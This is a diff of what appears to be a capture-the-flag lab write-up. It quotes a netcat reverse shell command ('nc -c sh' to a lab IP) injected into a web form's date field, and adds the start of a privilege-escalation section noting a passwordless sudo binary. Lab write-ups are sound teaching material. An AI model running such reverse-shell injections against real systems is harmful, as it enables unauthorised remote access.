@@ -116,3 +116,9 @@ In the browser, nothing could be modified, but the date field was the only param
 nc -c sh 10.10.14.107 4444
 ```
 The command was inserted into the date field and reverse shell as user dvir retrieved.
+
+# Shell as root
+## Enumeration
+<img width="927" height="107" alt="image" src="https://github.com/user-attachments/assets/667eb4b7-8ad0-4c16-9f45-ca7e6f2d86e6" />\
+user `dvir` can run `/usr/bin/syscheck` without password
+
